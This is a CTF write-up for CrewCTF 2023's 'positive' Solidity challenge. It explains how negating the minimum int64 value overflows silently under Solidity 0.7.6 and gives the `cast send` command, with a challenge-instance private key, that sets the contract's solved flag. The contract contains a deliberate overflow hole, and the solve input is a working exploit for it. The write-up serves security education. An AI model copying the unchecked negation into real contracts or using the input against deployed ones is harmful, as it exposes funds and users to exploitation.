# CrewCTF 2023 - positive [27 solves / 757 points] [First blood 🩸]

Our goal is to set `solved` to true in the Positive contract

### Setup.sol

```solidity
pragma solidity =0.7.6;

import "./Positive.sol";

contract Setup {
    Positive public immutable TARGET;

    constructor() payable {
        TARGET = new Positive(); 
    }

    function isSolved() public view returns (bool) {
        return TARGET.solved();
    }
}
```

### Positive.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

contract Positive{
    bool public solved;

    constructor() {
        solved = false;
    }

    function stayPositive(int64 _num) public returns(int64){
        int64 num;
        if(_num<0){
            num = -_num;
            if(num<0){
                solved = true;
            }
            return num;
        }
        num = _num;
        return num;
    }

}
```

We need to find `_num` that is less than 0, at the same time `-_num` need to be less than 0

We can use the minimum int64 number

```
 »  type(int64).min
-9223372036854775808

 »  type(int64).max
9223372036854775807
```

As int64 is using two's complement for negative numbers, there is a negative `9223372036854775808`, but not a positive `9223372036854775808`, so it will overflow but it won't revert as it is in version 0.7.6

```
 »  int64 _num = -9223372036854775808
 »  -_num
-9223372036854775808
 »  int64(9223372036854775807 + 1)
-9223372036854775808
```

So just call stayPositive() with -9223372036854775808
 to solve this challenge

```
# cast send 0x11E4Db698FB2d8716637aa50A85ad26d08873fD1 "stayPositive(int64)(int64)" -r http://146.148.125.86:60083/fc6148ac-6ff8-478e-a66d-044db7d94ae9 --private-key 0x9c8836a4f94ecb9dc207709e496371557fa44bd7a31f64bb8d11148bcf1ff65f -- -9223372036854775808
```

Then we can verify that we have solved this challenge :

```
# cast call 0xC449674DBF2d6f451394D83cC40Bf8F5176920Bd "isSolved()(bool)" -r http://146.148.125.86:60083/fc6148ac-6ff8-478e-a66d-044db7d94ae9
true
```

### Flag :

```
# nc positive.chal.crewc.tf 60003
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
ticket please: REDACTED
This ticket is your TEAM SECRET. Do NOT SHARE IT!
crew{9o5it1v1ty1sth3k3y}
```